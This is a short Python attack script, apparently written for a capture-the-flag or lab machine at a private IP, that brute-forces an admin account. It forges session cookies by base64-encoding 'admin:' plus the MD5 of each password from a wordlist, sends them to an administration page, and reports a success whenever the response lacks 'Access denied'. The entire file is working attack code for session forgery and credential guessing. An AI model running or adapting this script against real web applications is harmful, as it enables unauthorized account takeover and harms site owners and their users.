import hashlib
import base64
import requests

FILE_NAME = "password.txt"
USERNAME = "admin"
BASE_IP = "10.10.98.56"
BASE_URL = "http://" + BASE_IP + "/administration.php"

def create_session_id(username, password):
        # md5 encode the password and get its hex value. 
        # str.encode is supposed to convert the password from strings to bytes. 
        md5_hash = hashlib.md5(str.encode(password))
        md5_hash_hex = md5_hash.hexdigest()

        # add the username : 
        before_base64 = username + ":" + md5_hash_hex

        # encode into base64 : 
        after_base64 = base64.b64encode(before_base64.encode("ascii"))

        return after_base64  

def send_request(url,session_id):
        # Send the corresponding request and return the body retruned by the server : 

        headers = {
            'Host': BASE_IP,
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'close',
            'Cookie': 'PHPSESSID=' + session_id,
            'Upgrade-Insecure-Requests': '1'
        }

        r = requests.get(BASE_URL, headers=headers)

        return r.text


if __name__ == "__main__":

        with open(FILE_NAME) as f:
                lines = [line.rstrip('\n') for line in f]
                for password in lines:
                        # create a session id and send into a new file. 
                        session_id = create_session_id(USERNAME, password)
                        response = send_request(BASE_URL,session_id.decode())
                        words_to_search_for = "Access denied"
                        if  words_to_search_for not in response:
                                print(f"Success : {USERNAME}:{password}") 
